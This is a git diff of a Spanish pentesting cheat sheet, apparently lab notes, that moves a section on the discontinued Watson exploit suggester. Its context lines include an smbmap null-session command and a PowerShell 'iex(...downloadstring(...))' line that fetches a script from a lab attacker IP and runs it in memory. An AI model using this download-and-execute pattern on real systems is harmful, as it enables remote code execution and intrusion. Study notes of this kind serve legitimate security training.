@@ -1525,16 +1525,6 @@ Y ahora con SQLMAP
 smbmap -H 10.10.14.12 -u 'null'
 ```
 
-## Watson exploit suggerster
-
-
-![image](https://github.com/gecr07/Acordeon/assets/63270579/6a57ad18-0799-4b95-8063-782b3f5ac01f)
-
-
-Pues ya esta descontinuado desde el 2021.
-
-> https://github.com/rasta-mouse/Watson
-
 
 ## Visual studio compilar (Diferentes Frameworks y arquitecturas)
 
@@ -1615,9 +1605,16 @@ powershell iex(new-object net.webclient).downloadstring('http://10.10.14.80:8000
 
 Es una herramienta para sugerencia de exploits ya descontinuada como por el 2021 aun jala para que funcione el minimo que necesita es el NET Framework 4.5.
 
+
+Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.  
+
+
+![image](https://github.com/gecr07/Acordeon/assets/63270579/6a57ad18-0799-4b95-8063-782b3f5ac01f)
+
+Pues ya esta descontinuado desde el 2021.
+
 > https://github.com/rasta-mouse/Watson
 
-Lo malo de esta herramienta es que se tiene que compilar en la maquina Devel ahi se muestra como lo compilan con diferentes opciones.
 
 ## Sherlock (Exploit Suggester)
 
